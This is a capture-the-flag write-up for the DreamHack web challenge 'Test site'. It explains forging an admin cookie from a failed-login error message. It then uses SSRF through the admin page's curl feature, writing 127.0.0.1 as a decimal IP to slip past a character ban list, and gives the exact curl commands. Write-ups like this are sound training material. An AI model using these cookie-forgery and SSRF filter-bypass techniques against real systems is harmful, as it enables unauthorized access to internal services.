# Test site — DreamHack

> **Room / Challenge:** Test site (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** Test site (web)
- **Link**: `https://dreamhack.io/wargame/challenges/2064`
- **Level:** `2`
- **Date:** `25-11-2025`

---

## Goal

Escalate privelege and leveraging SSRF to get the flag.

## My Solution

To get the flag in `/flag` we have to be the admin to get access to `/admin` however we're still not the admin now, and the `setcookie` and `readcookie` is hidden:

```python
# def setcookie(id_str):
#     The code for this function is hidden

# def readcookie(cookie_str):
#     The code for this function is hidden
```

We can just blind testing to get admin role. There is a vulnerable in `/logintest` route:

```python
if username in user and user[username] == password:
    return "login success!"
else:
    errorcode = setcookie(username)
    return f"ERROR : errorcode {errorcode}"
```

Even if we enter the wrong `username` and `password` our input username is still be executed in `setcookie()`. Make a POST request to trigger that block of code:

```bash
$ curl -X POST http://host8.dreamhack.games:18232/logintest -d "username=admin&password=123"

ERROR : errorcode 8+fQVWU=
```

Use `8+fQVWU=` for cookie id to get access to admin:

```bash
$ curl -X POST http://host8.dreamhack.games:18232/admin --cookie "id=8+fQVWU="

admin page
```

Now we have successfully has admin role. To get the flag we have to make `curl` command in `/admin` to fetch data of `/flag` to receive the flag, since `/flag` just accepts request from localhost:

```python
@app.route("/flag")
def flag():
    if request.remote_addr not in ("127.0.0.1"):
        abort(403)
    return f"{FLAG}"
```

`/admin` curl functionality has a banned list:

```python
banlist = ["'","\"","\\","@","-","?",".","%","[","]","o"," ","c","s","p","h","s","t","u","x",":"]
```

So `http`, `https`, `localhost`,... is banned. There is still a method, we will use Decimal IP to make it curl for `2130706433` which equals to `127.0.0.1`. Final command to get the flag:

```python
curl "http://host8.dreamhack.games:18232/admin?url=2130706433/flag" --cookie "id=8+fQVWU="
```
